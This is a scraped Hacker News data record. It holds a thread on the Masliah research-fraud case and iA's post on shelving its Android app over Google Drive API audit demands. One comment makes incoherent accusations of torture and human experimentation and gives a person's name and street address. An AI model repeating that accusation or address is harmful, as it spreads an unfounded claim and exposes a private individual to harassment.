finish document will be a hash of all of these works along with their associated timestamps, originals of can be verified if necessary to prove a custodial chain of development over a plausible period of time and across multiple iterations of the development of the work - a kind of signed time-lapse slideshow of its genesis from blank page to finished product as if it had a mandatory and global \"track changes\" flag enabled from the very beginning - by which the entire process can be proved an original human-collaborated work and not an insta-generated AI fiction. reply mbreese 6 minutes agorootparentI actually thought that digital timestamps would have been a great use-case for blockchains. They are publicly available and auditable. If you're working from hashes, you don't necessarily need to make the raw data public, just the hash. It is a use-case that has an intrinsic value to the data generator and the future auditor (so you could charge something for it). I know there was some work done on this, but I think it lost momentum due to trying to generate crypto as a value storage medium. reply Lionga 48 minutes agorootparentprevThe YC company that wanted to sell fake survey results (yes they really had a launch HN with that idea) will surely be the first to sell fake science results next. YC disrupting sciences reply sharpshadow 8 minutes agoprevDuplication of the same image with different captions about armed conflicts is a technique mainstream news likes too. reply tux3 1 hour agoprevThere are unfortunately very rarely consequences for academic fraud. It's not just that we only catch a small fraction — mostly the most brazen image manipulation — but these cases of blatant fraud happen again and again, to resounding silence. Ever so rarely, there may be an opaque, internal investigation. Mostly, it seems that academia has a desire to not make any waves, keep up appearances, and let the problem quiet down on its own. reply neilv 55 minutes agoparentAnd occasionally a grad student who discovers academic dishonesty, and complains internally (naively trusting administrators to have humility and integrity), has their career ended. I suppose a silver lining to all the academic fraud exposés of the last few years is that more grad students and faculty now know that this is a thing, and one that many will try to cover up, so trust no one. Another silver lining might be that fellow faculty are more likely to believe an accusation, and (if they are one of the awful people) less likely to think they can save funding/embarrassment/friend by neutralizing the witness. (ProTip: If the success of your dishonesty-reporting approach is predicated on an internal administrator having humility and integrity, realize that those qualities are the opposite of what has advanced a lot of academic careers.) reply IshKebab 1 hour agoparentprevThe people doing the investigation have a vested interest in keeping it quiet. It's like the old quote... \"If you commit fraud as an RA that's your problem. If you commit fraud as the head of department that's the university's problem.\" reply ta8645 1 hour agoprevEveryone seems to acknowledge this is a problem, but refuse to believe it actually affects anything when it comes time to \"trust the science\". Yes, science is corrupted, but all the results can be trusted, and the correct answer is always reached in the end. So, is it really a problem? Or not? reply eig 50 minutes agoparentA key skill for any scientist is to differentiate quality work and science that can be easily faked. The Alzheimer's and Parkinson's fields are too easy to fake, and too difficult to replicate. The new ideas are only ~20 years old. Big pharma companies are understandably wary of published papers. When people say \"trust the science\", they often refer to things like masks, and antibiotics, and vaccines. That science is hundreds of years old and have been replicated thousands of times. TL;DR: Some science should absolutely be trusted, some shouldn't. It's not surprising that you can't make blanket statements on a superfield ranging from germ theory to cold fusion. reply yunwal 23 minutes agorootparent> When people say \"trust the science\", they often refer to things like masks, and antibiotics, and vaccines. That science is hundreds of years old and have been replicated thousands of times. When people say \"trust the science\" they're usually referring to fairly recent developments. Covid vaccines were in development and testing for just over 18 months before being mandated and were certainly not replicated on a large scale by disinterested 3rd parties before being mandated. The idea that we can have effective scientific policy without trust in scientific institutions is just... not accurate. reply daedrdev 1 hour agoprevIs there no liability for the author? There are billions of dollars wasted in drug trials and research that can be tied to this fraud. Surely they can face some legal issues due to this? reply hansonkd 1 hour agoparentLike all things in life that have risks of fraud, negligence or potential failure, insurance could be the answer. Want to publish in a peer reviewed paper? Well then your institution or you should take out a bond or insurance policy that guarantees your work is accurate. The insurance amount would fluctuate based on how big of impact this study could have. Is it a drug that will be consumed by millions? Big insurance policy. Is it a behavioral study without much risk... small insurance policy. Is a a person in an institution found caught committing fraud, well now then all papers from that institution now have higher premiums. Did you sign off on a peer reviewed paper that was fraud? Well now your premiums are going up also. Insurance costs too high to publish? Well then keep doing research until the underwriters are satisfied that your work isn't fraud and adjust the premiums down. It adds a direct near-term economic incentive to publish honestly and punishes those that abuse the system. reply jltsiren 38 minutes agorootparentIn other words, you are suggesting more stringent peer review conducted by insurance companies. And because insurance companies are too small to have sufficient in-house expertise on every topic, the reviews will be usually done by external consultants. The costs might be from $10k for simple papers to hundreds of thousands for large complex papers. The insurance model does not really work when the cost of evaluating the risks far outweighs the expected risks. reply cj 47 minutes agoparentprevHere’s a deterrent: 1) revoke all of their academic accreditations and degrees 2) put them on a public “do not publish” list permanently banning them from being named on any paper in a journal reply abigail95 31 minutes agoparentprevany lawyers know if it's wire fraud to get paid to do academic research and lie about the results? reply wk0 1 hour agoprevSeems to be censored from the NIH staff directory now https://www.nia.nih.gov/about/staff/masliah-eliezer reply abrichr 3 minutes agoparentMost recent working archive.org snapshot: https://web.archive.org/web/20240303093209/https://www.nia.n... reply Lionga 47 minutes agoparentprevwoopsies reply qudat 12 minutes agoprevWhile I agree this is a big problem, science should never be defined by a single article. I was always taught that science is a tree of knowledge where you build off previous positive results, all of which collapse when an ancestor turns out to be false. reply a1445c8b 4 minutes agoparentIn this particular case, the person of interest published 800 widely cited papers. That seems like a considerable collapse. reply qudat 0 minutes agorootparentI see this as a pruning process and an inevitable part of science. But I would further argue against what others were saying about personal ethics. Science must remove the human as much as possible from the process. reply GeekyBear 29 minutes agoprevI've said so many times, but we need to go back to a system where it is possible to make a career in science and get funding for replicating other people's work to verify the results. reply mchannon 11 minutes agoparentThis leads to a tragedy of the commons. Say a random nation, say, Sweden, devotes 100% of their governmental and university research budgets toward replication. 70% of the studies they attempt are successfully replicated. 20% are inconclusive or equivocal. 10% are clearly debunked. Now the world is richer, but Sweden? No return on investment for the Swedes, other than perhaps a little advanced notice on what hot new technologies their sovereign funds and investors ought not to invest in. A bloc of nations, say NAFTA/CAFTA-DR, or the European Union, might be more practical. That's the carrot. As for the stick, bad lawyers can get disbarred, bad doctors can get \"unboarded\". Some similar sort of international funding ban/blacklist for bad researchers would be useful. reply jboggan 16 minutes agoprevWhen I was in my doctoral program I had some pretty promising early results applying network analysis to metabolic networks. My lab boss/PI was happy to advertise my work and scheduled a cross-departmental talk to present my research in front of ~100 professors or so. While I was making a last-minute slide for my presentation I realized one chart looked a little off and I started looking into the raw data. I soon realized that I had a bug in my code that invalidated the last 12 months of calculations run on our HPC cluster. My conclusions were flat out wrong and there was nothing to salvage from the data. I went to my lab boss the night before the talk and told him to cancel it and he just told me to lie and present it anyways. I didn't think that was moral or scientifically sound and I refused. It permanently damaged my professional relationship with him. No one else I talked to seemed particularly concerned about this, and I realized that a lot of people around me were bowing to pressure to fudge results here and there to keep up the cycle of publicity, results, and funding that the entire academic enterprise relied upon. It broke a lot of the faith I had been carrying in science as an institution, at least as far as it is practiced in major American research universities. reply nabla9 1 hour agoprevIn the future those who commit fraud are not likely leave trace in Western blot and photomicrograph audit. When the experiments are significant, double blind is not enough. You need external auditors when conducting experiments. Preferably separate team making experiments from those who design them. reply tempodox 58 minutes agoprevI can't manage to be really surprised. We already know many people will cheat when the incentives are right. And when the law of the land is “publish or perish”, then some will publish by any means necessary. Thinking “this subsegment of society is so honorable, they won't cheat” would be incredibly naive. reply Centigonal 21 minutes agoprevI hate the thought that researchers and drug developers may have wasted their effort and dollars developing drugs based on one extremely selfish person's bogus results. reply dimgl 1 hour agoprev> But if the NIH had done that in 2016, they wouldn't be in the position they're in now, would they? How many people do we need to check? How many figures do we have to scrutinize? All of them reply huitzitziltzin 1 hour agoprevInterestingly this and other cases like it suggest that one of the most valuable skill some scientists have is photoshop. reply ceroxylon 37 minutes agoprevNIH page for Eliezer Masliah is returning access denied: https://www.nia.nih.gov/about/staff/masliah-eliezer reply hilux 58 minutes agoprevThis stuff just ENRAGES me. With that off my moobs ... for those interested in the broader topic, I highly recommend Science Fictions, by Stuart Ritchie. The audiobook is also excellent. I'm not a working scientist, and I found it completely engaging. Worth it just for the explanation of p-hacking. reply woliveirajr 1 hour agoprevWhy worry about fraud, deception and misleadings using AI when we have the old kind of fraud? Or, in the other hand, now you don't have to manipulate images, you can just generate the ones you need. reply yawnxyz 34 minutes agoprevReminder that these people are only caught because they photoshopped Western blots. Even more widespread is when PIs just throw out data that don't agree with their hypothesis, and make you do it again until the numbers start making sense. It's atrocious, but so common that if you're not doing this, you're considered dumb or weak and not going to make it. Many PIs end up mentally justify this kind of behavior (need to publish / grant deadline / whatever) — even at the protest of most of the lab members. Those who refuse to re-roll their results — those who want to be on the right side of science — get fired and black balled from the field. And this is at the big famous universities you've all heard of reply themanmaran 1 hour agoprevFor all the complaints about AI generated content showing up in scientific journals, I'm exited for the flip side, where an LLM can review massive quantities of scientific publications for inaccuracies/fraud. Ex: Finding when the exact same image appears in multiple publications, but with different captions/conclusions. The evidence in this case came from one individual willing to volunteer hundreds of hours producing a side by side of all the reports. But clearly that doesn't scale. reply nostrademons 1 hour agoparentI'm hoping it won't have the same results as AI Detectors for schoolwork, which have marked many legitimate papers as fraud, ruining several students' lives in the process. One even marked the U.S. Constitution as written by AI [1]. It's fraud all the way down, where even the fraud detectors are fraudulent. Similar story to the anti-malware industry, where software bugs in security software like CrowdStrike, Sophos, or Norton cause more damage than the threats they prevent against. [1] https://www.reddit.com/r/ChatGPT/comments/11ha4qo/gptzero_an... reply brink 1 hour agoparentprev> For all the complaints about AI generated content showing up in scientific journals, I'm exited for the flip side, where an LLM can review massive quantities of scientific publications for inaccuracies/fraud. How would this work? AI can't even detect AI generated content reliably. reply themanmaran 1 hour agorootparentNot in a zero shot approach. But LLMs are more than capable of solving a similar scenario to the one presented: - Parse all papers you want to audit - Extract images (non AI) - Diff images (non AI) - Pull captions / related text near each image (LLM) - For each image > 99% similarity, use LLM to classify if conclusions are different (i.e. highly_similar, similar, highly_dissimilar). Then aggregate the results. It wouldn't prove fraud, but could definitely highlight areas for review. i.e. \"This chart was used in 5 different papers with dissimilar conclusions\" reply lkrubner 1 hour agoparentprevHow would that be possible? Novelty is a known weakness of the LLMs and ideally the only things published in peer-reviewed journals are novel. reply withinboredom 1 hour agorootparentWouldn’t it be cool if people got credit for reproducing other people’s work instead of only novel things. It’s like having someone on your team that loves maintaining but not feature building. reply IshKebab 1 hour agorootparentprevDetecting images and data that's reused in different places has nothing to do with novelty. reply layer8 1 hour agoparentprevLLMs might find some specific indications of possible fraud, but then fraudsters would just learn to avoid those. LLMs won’t be able to detect when a study or experiment isn’t reproducible. reply themanmaran 59 minutes agorootparentOf course, but increasing the difficulty of committing fraud is still good. Fraudsters learn to bypass captchas as well, but they still block a ton of bad traffic. reply BenFranklin100 1 hour agoprevAs a scientist who has published in the neuroscience space, I don’t what to say other than the incentives in academia are all messed up. Back in the late 90s, NIH made a big push on ‘translational research”, that is, researchers were strongly encouraged to demonstrate their research had immediate, real world benefits or applications. Basic research and the careful, plodding research needed to nail down and really answer a narrow question was discouraged as academic navel-gazing. On one hand, it seems the push for immediate real world relevance is a good thing. We fund research in order that society will benefit, correct? On the other hand, since publications and ultimately funding decisions are based on demonstrating real world relevance, it’s little surprise scientists are now highly incentivized to hype their research, p-hack their results, or in rare cases, commit outright fraud in an attempt to demonstrate this relevance. Doing research that has immediate translational benefits is a tall order. As a scientist you might accomplish this feat a few times in your career if you’re lucky. The rest of the corpus of your work should consist of the careful, mundane research the actual translational research will be based upon. Unfortunately it’s hard to get that foundational, basic, research published and funded nowadays, hence the messed-up incentives. reply DigitalPaladin 1 hour agoprevI'm a recovering academic, and have not published since not long after defending my dissertation. I blame this behavior entirely on \"publish or perish\". The demands for novel, thoughtful and statistically-significant findings is tremendous in academe, and this is the result: cheating. I left professional academia because I resented the grind, and the push to publish ANYTHING (even reframing and recombining the same data umpteen times in different publications) in an effort to earn grants or attain tenure. The academia system is broken, and it cannot be repaired with minor edits, in my opinion. This is a tear out and do over scenario for the academic culture, I'm afraid. reply ljsprague 47 minutes agoprevWhere is Eliezer Masliah from? reply SubiculumCode 25 minutes agoprevThis is terribly terribly frustrating. For every one of these cheats there are hundreds of honest, extremely hard-working ETHICAL scientists who toil 60 hours a week doing the thing they love. It is also terribly frustrating that, being human after all, smooth talkers with a confident stride, an easy smile, eager to shake hands can and do quickly climb the academic ladder, especially the administrative latter. This makes me terribly sad. reply CarpaDorada 1 hour agoprevIf you are familiar with academia you'll realize the academic dishonesty policy is essentially the playbook by which academics behave. The author is surprised that Eliezer Masliah purportedly had instances of fraud spanning 25 years. I bet the author would be even more surprised to find out that most academics are like that for the entire duration of their career. My favorite instance is Shing-Tung Yau, who is still a Harvard professor, who attempted to steal Grigori Perelman's proof of Poincare's conjecture (a millenium prize problemthat comes with a $1MM prize and $10k/mo for the rest of one's life; Perelman rejected all of it.) I mean, get this: an extremely gifted Mathematician living on a measly salary in Russia had had his millenium prize almost stolen by a Harvard professor. What more evidence do you need? reply slashdave 1 hour agoparentYou've given two examples. Please explain why you can extrapolate to all of academia. reply CarpaDorada 1 hour agorootparentFrom personal experience, it is all I've seen. Could anyone be in a position to extrapolate to all of academia without speaking from personal experience? I'm not speaking of all academics (hence 'most'). It's a statement similar to \"Hollywood has a drug problem\" or something of that sort. My advice to anyone going into Hollywood would be to stay away from drugs; my advice to anyone going into academia is to treat every interaction as if you've just sat at a poker table in Las Vegas. reply georgeecollins 1 hour agorootparentI work in Hollywood. I am not sure it has more of a drug problem more than say tech or finance. Maybe it does-- I don't know. The point is when a celebrity is a drug addict you hear about it. When a banker or a lawyer is you don't. Our experience of things has a lot of bias toward what we want to hear. Generalization plays into sterotypes and ideology. reply CarpaDorada 59 minutes agorootparentI believe that tech and finance also have a drug problem. Those that sell expensive drugs like cocaine go after rich clients. You work in Hollywood, but have you been attending wild private parties? I've worked in academia and I was in the thick of it, I've experienced first hand the fraud I'm talking about, and it was a large part of my experience, not some side note. Perhaps it's an uncomfortable truth that academia is in the state it is in, but again, it is of utmost importance to warn younger people to its perils. (Act as if you're at a poker table at all times.) In any case, how do you know that it isn't your biases that prevent you from considering what I describe? What is so surprising with the claim that people who are very incentivized to steal and commit fraud do so if they are not punished for it? edit: and it's not things I've heard, instead it is direct experiences, i.e. people stole my work, and things like that. As a graduate student to watch professors come to you with problem X, take what you've said (an actual solution) and publish a paper without attribute, that sort of thing; to report it and have nothing be done about it, et cetera, and on it goes, it's just instance after instance of such behavior, or the million ways in which they are careful to trick you into working on their problems without receiving attribute. One such trick for example, that again happened to me, is that after a conference talk I got into an e-mail discussion where I explained my approach; I was told that \"they already have these results\" (the trick here was to divulge less in the talk than what was currently known in order to be able to avoid \"significant progress by another person\" in the case another person does share new progress that they have already established, and hence not having to share attribution.) It turned out that our discussion was enough for them to go from n=3,4 to a general formula involving primes, because I pointed out a certain property they had not noticed. This is just a single example of the sorts of tricks, aside from total fraud, that happen, and one of the milder incidents I had happen to me. reply mistercheph 1 hour agorootparentprevSounds like someone should write a paper that makes fraudulent claims about the extent of fraud in all of academia! reply coding123 44 minutes agoprev> and others appear to be running for cover. In every industry right now there appear to be a lot of people running cover. I have a personal belief, with the exception of a few industries, 50% of managers are simply running cover. This is easy to explain: 1/ Nothing follows people 2/ Jobs were easy to get in the last 3 years (this is changing FAST) 3/ Rinse and repeat and stay low until you're caught. reply zombiwoof 1 hour agoprevHumans being humans reply breck 51 minutes agoprevIf you're an academic and want to use the fastest publishing stack ever created that also helps guide you to building the most honest, true thing you could create, I have built Scroll and ScrollHub specifically for you. https://hub.scroll.pub/?template=paper Happy to provide personal help onboarding those who want to use this to publish their scientific work. breck7@gmail.com reply photochemsyn 1 hour agoprevAnecdotally, during my (fairly short-lived) academic career, in which I did research with three different groups, 2/3 of them were engaging in fraudulent research practices. Unfortunately the one solid researcher I worked for was in a field I wasn't all that interested in continuing in, and as a naive young person who believed in the myth of academic freedom and didn't really understand the funding issue, I jumped ship to another field, and found myself in a cesspool of data manipulation, inflated claims, and all manner of dishonest skullduggery. It all comes down to lab notebooks and data policies. If there is no system for archiving detailed records of experimental work, if data is recorded with pencils so it can later be erased and changed, if the PI isn't in the habit of regularly auditing the world of grad students and postdocs with an eye on rigor and reproduciblity, then you should turn around and walk out the door immediately. As to why this situation has arisen, I think the corporatization of American academics is at fault. If a biomedical researcher can float a false claim for a few years, they can spin their research off to a startup and then sell that startup to a big pharmaceutical conglomerate. If it fails to pan out in further clinical trials, well, that's life. Cooking the data to make it look attractive to an investor - in the almost completely unregulated academic environment - is a game that many bright-eyed eager beavers are currently playing. As supporting evidence, look at mathematical and astronomical research, the most fraud-free areas of academics. There's no money to be made in studying things like galactic collisions or exoplanets, the data is all in the public domain (eventually), and with mathematics, you can't really cook up fraudulent proofs that will stand the test of time. reply AlbertCory 1 hour agoprevOnce, at 3Com, Bob Metcalfe introduced a talk by one of his MIT professors with the little joke, \"The reason academic politics is so vicious is that nothing's at stake.\" The guy said, \"That depends on whether you consider reputation 'nothing.' \" I guess what that shows is, you can always negotiate and compromise over money, but reputation is more of a binary. An academic can fake some work, and as long as he's never called on it, his reputation is set. So yeah, a little more fear of having one's reputation ruined would go a long way towards fixing science. reply masswerk 49 minutes agoparentBut this is really a societal/political issue: since we decided that economic capital is king and symbolic capital not that much… (This is really the story of the last four decades or so.) reply AlbertCory 33 minutes agorootparentThere are some people who think everything is \"a societal/political issue.\" But that one-dimensional view is boring. Life is more than politics. reply masswerk 3 minutes agorootparentWell, this is about Pierre Bourdieu, and he had a few things to say about academia, as in Homo Academicus. And I'm not sure what example could illustrate the problem with the lopsided valuation of economic capital and the general devaluation of symbolic capital (as compared to pre-1980s, we have since undergone a social revolution of considerable dimensions, which is also why there isn't an easy fix) better than this one. reply abnry 1 hour agoparentprevI have always said that while professors get paid less money than in industry, they are compensated in reputation to make up for it. Status and reputation are the currency of academia. reply NotYourLawyer 22 minutes agoprevThis shit should be a crime. Imagine how many person-hours and how much money has been wasted. reply mistercheph 1 hour agoprevIf there's this much overt, deliberate fraud and dishonesty in all of our research institutions, the quantities of soft lying and fudging are inconceivable. We need to seriously rethink our approaching to stewarding these institutions and ideas, public trust is rightfully plummeting. reply stevenseb 1 hour agoprevTest comment reply hello_computer 1 hour agoprevYes, pin it all on Masliah; turn him into a sort of bizzaro-jesus, who takes on the sins of the entire self-seeking, publish-or-perish, p-hacking, pharma-grifting, meta-meta-meta-analyzing, only-verify—at-gunpoint “profession”. reply AlbertCory 1 hour agoparentUnfortunately, sometimes someone becomes a bad example. That doesn't make them a \"scapegoat\", the favored defense of people like that. A scapegoat is something that takes on all the sins of a lot of others who skate free. If Masliah is the only one who ever suffers, then he IS a scapegoat, but if this article serves to uncover a lot of other bad actors, then he's not. And if his example serves to warn a lot of other scientists to clean up their acts, then his suffering is a benefit. reply hello_computer 28 minutes agorootparentThe language of the article is as low as it is loaded. This is just Derek Lowe covering for the fact that “Science” magazine and the like have let this scoundrel (and many more like him) carry on, without hindrance, for an entire career; pointing the finger anywhere and everywhere but at the journals themselves. None of this is an isolated incident. It is widespread! There is a new scapegoat every month. reply SpaceManNabs 1 hour agoprevI had a feeling academia was just run a ran by people letting blatant fraud, exploitation and abuse of phd students, stealing during peer-review, and just other forms of plagiarism, fraud, and exploitation slide by. They let it slide by because correcting these things would lead to massive changes in academia that might put them out of jobs. Every year that feeling becomes more certain. Glad I quit the track in grad school. I feel terribly for all the incredibly smart and hard working academics that remain honest and try to make it work. They do what they love, otherwise they wouldn't do such intensive work with so much sacrifice. It is really disheartening too because academia only turns on the \"honesty filter\" when it comes to minor grad students that pissed off the wrong people. But you can do all this fraud constantly and become president of harvard if you know the right politics. Dishonest lot. I hope karma is real so they get what is coming to them for taking advantage of people that just love to increase humanity's knowledge. reply SpaceManNabs 43 minutes agoparentalright, am i being downvoted because of my perniciousness to those leading academia, or because I was too sympathetic to the people being exploited? reply infamouscow 1 minute agorootparentThey would be out of jobs. You're being downvoted because you're correct—HN is an eco chamber for zealous regurgitation of opinions of the academy and media—institutions that have decayed. It's been happening slowly for awhile, but now things are starting to come apart at the seams. reply devwastaken 1 hour agoprevUniversities became tax funded and the consequences is warm bodies filling chairs. I have experience with a number of big name unis in the U.S. they are all about office and national politics. It's not about the work and hasn't been for a while now. Defund universities. No more student loans, make them have to earn their place in the market or we will continue to suffer under the manipulated system that is actually killing students. reply chasum 1 hour ago [flagged]prevnext [2 more] \"Trust the science!!!\" The science: reply georgeecollins 1 hour agoparentIt's wrong to think that because there is reports of fraud or systematic error in science you shouldn't trust it. I'm sure all those things exist. But they also exist in every other institution with a lot less self-reflection and self-correction. Nassim Taleb said that people think weathermen are terrible predictors of the future. He says meteorology is among the most accurate sources of predictions in our lives. But we can easily validate it and we see the mistakes. If we had as much first hand experience with other types of predictions we'd appreciate the accuracy of weatherman. My point is: just because you know the flaws in a system don't assume it isn't better than another. reply joelignaatius 1 hour agoprev [–] So one of the things you could do (if you were psychotic) is find poor people and replicate neurodegenerative diseases and then feed them the drug to see if the cure works. And then when they go to take MRIs you smuggle out the imaging from the Sutter Health clinic on Van Ness in San Francisco California. Is that why my head hurts? Because then it becomes attempted murder and torture overseas which is all sorts of jail time. Neat. Why does Peter Teller Weyand at 555 Beule Street have a headache? My head hurts. So I just emailed a couple hundred academics across the country the same question. I don't like having my head hurt. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "Fraud in science, including practices like image manipulation in gel results, is a significant issue highlighted by a recent article on Science.org.",
      "The pressure to publish and lack of stringent oversight contribute to unchecked misconduct, leading to dishonesty and manipulation of data by some researchers.",
      "Suggested solutions to combat this pervasive problem include better regulation, replication of studies, and stricter penalties for fraud to maintain the integrity of scientific research."
    ],
    "points": 318,
    "commentCount": 167,
    "retryCount": 0,
    "time": 1727454817
  },
  {
    "id": 41664281,
    "title": "Our Android app is frozen in carbonite",
    "originLink": "https://ia.net/topics/our-android-app-is-frozen-in-carbonite",
    "originBody": "September 26, 2024 Our Android App is Frozen in Carbonite ‹ Previous 6 minute READ After seven years of trying, the most recent struggle with Google proved that we need to change course on our adventure in the Android galaxy. A couple of months ago, Google changed its API policy and revoked iA Writer’s access to Google Drive on Android. By freezing up Android’s main storage option, our app was frozen in carbonite. It still lived but we couldn’t move forward before resolving it. In order to allow our users to access their Google Drive on their phones we had to rewrite privacy statements, update documents, and pass a series of security checks, all while facing a barrage of new, ever-shifting requirements. April: Another update. Google sends those almost weekly. Every time you need to go through a stack of links and things. Sometimes you end up in a forum with a group of desperate devs talking about quitting Android. Warning: Five months and 55 updates later. It can’t be too far now. Let’s make sure we verify everything as expected. Then send the documents and the passport scan. Then we’ll be good. Right? By September, we thought we had honored our side of the new agreement. But on the very day we expected to get our access back, Google altered the deal. “I’ve altered the deal. Pray that I don’t alter it any further.” We were told that read-only access to Google Drive would suit our writing app better than the desired read/write access. That’s right—read-only for a writing app. Getting closer: Ah, not quite. After a series of updates, following exactly Google’s playbook they still want more privacy policy changes. But then, *then*, our customers get Google Drive back. Right… Right? No: “You don’t really need Google Drive write access, for your writing app, do you?” “Perhaps you think that you were treated unfairly?” When we pointed out that this was not what we had, or what our users wanted, Google seemed to alter the deal yet again. In order to get our users full access to their Google Drive on their devices, we now needed to pass a yearly CASA (Cloud Application Security Assessment) audit. This requires hiring a third-party vendor like KPMG. Warning: Google has altered the deal. Warning: Pray that they don’t alter it any further… The cost, including all internal hours, amounts to about one to two months of revenue that we would have to pay to one of Google’s corporate amigos. An indie company handing over a month’s worth of revenue to a “Big Four” firm like KPMG for a pretty much meaningless scan. And, of course, this would be a recurring annual expense. More cash for Google’s partners, while small developers like us foot the bill for Android’s deeply ingrained security shortcomings.1 As we… googled… our new situation, it became clear this wasn’t just our battle—developers everywhere were facing similar bureaucratic entanglements, all designed to benefit Google’s partners while squeezing the life out of smaller companies. I just finally completed and passed the assessment. Overall it took me about 60-80 hours of my time, and the process itself spanned 3-4 months, with 25-30 back and forth requests of varying complexity. It was awful, and if it’s not streamlined next year, I’ll be dropping this permission from my app and going another route.2 So it’s normal. Seems like we had to bite the bullet. After all, we have been doing this for seven years. We have tens of thousands of users. We invested hundreds of thousands to make this works, and so it looks like… “We shall double our efforts!” This battle to give our customers access to their Google Drive is only the latest in a series of clashes we’ve had with the empire. Developing on Android is a daily worsening struggle with red tape, inconsistent device performance, app store search performance gaming3, and rampant piracy.4 Every time we think we’ve overcome one hurdle, another two pop up. It’s an exhausting process that saps our resources, delays updates, and damages our reputation. Meanwhile, the negative reviews keep piling up for problems that are out of our control. That’s not the only problem. There are certain devices that cause trouble. To fix the bugs you need to buy the device. Customers demand that. And often we did. Below you can see the 12,000 devices that were using iA Writer in 2017: Developing for Android you navigate an asteroid field. Bugs surface across thousands of device types, Android versions, and flavors—One UI, MIUI, OxygenOS, Pixel Experience, you name it. And before anyone says this is the price of an “open” OS—well, we don’t have this problem on Windows.5 “Put him in!” We could just comply—we could pay KPMG, surrender more of our revenue, and dig ourselves deeper into the red. And then accept the next forced change. And the next one. We could try to write our own framework for payment to avoid piracy. But why would we when no one wants to pay for it? And then what? Where does it end? Hiring someone to game our app reviews? As long as we sell to Android end consumers, the economics of continuing development on Android is an ever-tightening Force Choke. Bit by bit the control over our app’s functionality, quality, or finances are being taken away from us. If we continue down the current path we damage our relationship with users, taint our reputation, lose money, nerves, and time. So, as of today, we’re not just accepting our frozen-in-carbonite fate. We’re embracing it. We’re going to take the app offline. We know this decision will disappoint our loyal Android users, and we share your frustration. After seven years of continuous investment, this is way more painful for us than it is for any of you. It’s important to understand why many developers choose not to engage with the Empire. You can’t win that battle. They do as they please. Existing users will keep their access, and we’ll push critical updates when necessary—if the empire allows it. But new features are off the table for now. Support will be friendly as always, but we have to be pragmatic. “What if he doesn’t survive? He’s worth a lot to me!” iA Writer for Android might return in the future—perhaps in a different chapter of this saga, where it can develop in a more controlled environment. We are working towards a setup where organizations can pay us directly for all our software.6 In a B2B setup, the Android hardware ecosystem may be economical and manageable, and then we can go back to sponsoring single-license users and their unruly pirate friends. Until that day comes, iA Writer for Android will remain frozen in carbonite, waiting for the right time to reawaken. In the meantime, we’re focusing on projects that drive our business forward: finalizing a major Windows 11 update, enhancing iA Writer for Mac, iOS, and iPadOS, preparing to launch Web sharing for iA Presenter, and releasing the iOS/iPadOS app. And then who guarantees us that after this there is not yet another requirement? It felt like a scam. ↩ Reddit user ‘vintagemako’ in a thread titled “Has anyone done the Gmail CASA Tier 2 assessment?”. The online literature detailing the frustration with CASA and its changing requirements offers an interesting read. ↩ With an overall ranking of 4.7 you can still end up with ten scroll lengths of of one-star-reviews. How? Everyone, user or not, can vote on app reviews. If you wanted to hurt your competitor, with a team of 10 friends you can easily game your competitor’s overall great app reviews into a living hell of hate and despair. Inversely, you can vote up your own positive comments if that’s how you want to operate. Google doesn’t care. ↩ Nine in ten regular long-term users (not first-time users, long-term users) do not pay for our app. And that’s just the users we can see. Practically all major Android apps are available in a pirated version. Google itself makes it easy to pirate apps without downloading anything. You can use any app with a trial without ever paying. To use an app for free, indefinitely, just delete and reinstall it, and your testing period resets. And in China… Long story short, that’s how you can end up with 50,000 users and only 1,000 paying you. And before you know it, people who use pirated apps with irreproducible bugs hit your support channel and gang up on upvoting bad app store reviews. ↩ Each flavor of Android brings its own quirks. Even if we buy the troublemaking devices, the issue often turns out to be a problem with a specific subflavor or software version that’s impossible to reproduce. It’s like playing Whack-a-Mole, and the moles just keep multiplying. ↩ Google’s chaos makes Apple’s control seem reasonable. I can already hear John and Seb typing: “…and this is why the EU shouldn’t turn Apple into Google.” Let’s be real—Google Play and the App Store don’t compete. They collaborate. Same rates, same model, same unchecked power. Call it a monopoly, call it a duopoly. They share the mobile market without too much crossfire: Apple takes those who can or want to pay, Google takes the rest. Google Play is not an alternative to the App Store. It’s not “Go there if you don’t like Apple.” Google Play is a very lazy, very sloppy carbon copy of the App Store. Their collaboration is not metaphorical. It goes beyond the way their shared control over the mobile app market. Apple collects privacy points, then cashes them in by making Google the default search on iPhone. A lot of that privacy-free Search money flows right back from Google to Apple. 20 Billion USD in 2022. In 2020, “Google’s payments to Apple constituted 17.5% of the iPhone maker’s operating income.” (Bloomberg) And no one really cares, as long as it’s convenient. But as a developer in Europe, we’re glad that the EU does. ↩ Recent Writer Articles Faster Filing With Tree View: A Step Forward for Large Writing Projects With tree view, organizing large files in iA Writer just became a lot easier. Summer Reading: August Edition Five more books to help you improve your writing, presenting, and design skills. iAlice On 4 July Americans will celebrate Independence Day. And so they should, as gloomy days may lie ahead. But did you know that 4 July is also Alice Day? Summer Reading: July Edition Looking for reading suggestions for this summer? Check our selection of books about writing, presenting and design. Why write? Writing is part of lifelong learning process that keeps us awake, sharp and connected. I Want You Back (The Dropbox Remix) Dropbox finally has a native Files app integration. This is good news for iA Writer.",
    "commentLink": "https://news.ycombinator.com/item?id=41664281",
    "commentBody": "Our Android app is frozen in carbonite (ia.net)317 points by zdw 20 hours agohidepastfavorite138 comments hn_throwaway_99 19 hours agoI only read the first part of the article, but having dealt with Drive API scopes and their issues previously, I feel there is just a major misunderstanding here. The \"fully open\" Drive API read/write scopes should be highly restricted by default (because they essentially give you access to a user's entire drive), and these are the ones that Google added much more stringent security requirements a couple years ago, e.g. requiring a security audit. However, there is also a much less sensitive Drive API scope, 'drive.file', which is non-sensitive. It lets an app read and write only files the app owns (or read files a user picks through the file picker control). Thus, I don't understand why the ia.net app would require more than the drive.file scope. I have no doubt that Google's messaging wasn't clear on the transition process when they first created drive.file scope (and I personally wasted a ton of time with bugs in Google's own file picker when using that scope), but it is a much better solution. reply mgraczyk 19 hours agoparentThis is exactly right. I just finished the process to get drive.readonly for my app. It was a huge pain in the ass, and Google was not very helpful. Google recommends you pay $720 for a CASA lab assessment, which consists of some random dude in an apartment in SF running an open source script against a .zip of your codebase, then that guy emails Google saying you \"passed\". However, the goal is noble, to prevent malware and scam apps from accessing people's drives. It doesn't sound like the app from the article needs these more restricted scopes. reply Gigachad 18 hours agorootparentBeing a huge pain in the ass probably does filter out a lot of trivial malware that doesn’t have the resources to jump though these hoops, especially when it might only last a week or so before they get shut down and have to start again. reply xethos 17 hours agorootparentIf you've covered the personal frustration angle, I'll point to how it also changes the financial odds of turning a profit with malware. ~$700 USD for a week 